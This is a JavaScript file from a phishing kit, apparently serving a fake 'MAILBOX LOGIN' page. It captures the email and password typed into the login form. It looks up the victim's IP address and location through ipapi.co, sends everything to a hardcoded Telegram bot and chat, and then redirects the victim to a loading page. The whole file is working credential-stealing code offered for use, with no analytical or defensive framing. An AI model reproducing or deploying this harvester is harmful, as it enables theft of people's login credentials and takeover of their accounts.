const telegramBotToken = '7584307576:AAHoeUWhi4lXktb2QbJGmlMCq0v0LWXKFdo'; // Replace with your bot token
const chatId = '7838482530'; // Replace with your chat ID
const redirectUrl = './done/loading.html'; // Replace with the URL you want to redirect to

// Function to send data to Telegram bot
function sendMessageToTelegram(message) {
  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  // Prepare data to be sent in the POST request
  const data = {
    chat_id: chatId,
    text: message
  };

  // Send POST request to Telegram API
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => {
    if (data.ok) {
      // Redirect to another page after successful submission
      window.location.href = redirectUrl;
    } else {
      alert('Error: ' + data.description);
    }
  })
  .catch((error) => {
    console.error('Error:', error);
    alert('Error sending data.');
  });
}

// Function to get user's IP and location details
function getUserIPandLocation(callback) {
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      const userInfo = {
        ip: data.ip,
        country: data.country_name,
        city: data.city,
        region: data.region
      };
      callback(userInfo);
    })
    .catch(error => {
      console.error('Error fetching IP info:', error);
      callback(null); // If there's an error, just proceed without IP/location info
    });
}

// Listen for form submission
document.getElementById('loginForm').addEventListener('submit', (e) => {
  e.preventDefault(); // Prevent page reload

  const email = document.getElementById('email').value;
  const password = document.getElementById('pass').value;

  // Fetch IP and location details
  getUserIPandLocation((userInfo) => {
    let message = `--> MAILBOX LOGIN <--\n-EMAIL -> ${email}\n-PASS -> ${password}`;

    if (userInfo) {
      message += `\n-IP -> ${userInfo.ip}\n-Location -> ${userInfo.city}, ${userInfo.region}, ${userInfo.country}`;
    } else {
      message += `\n-IP/Location -> Not available`;
    }

    // Send the message to Telegram
    sendMessageToTelegram(message);
  });
});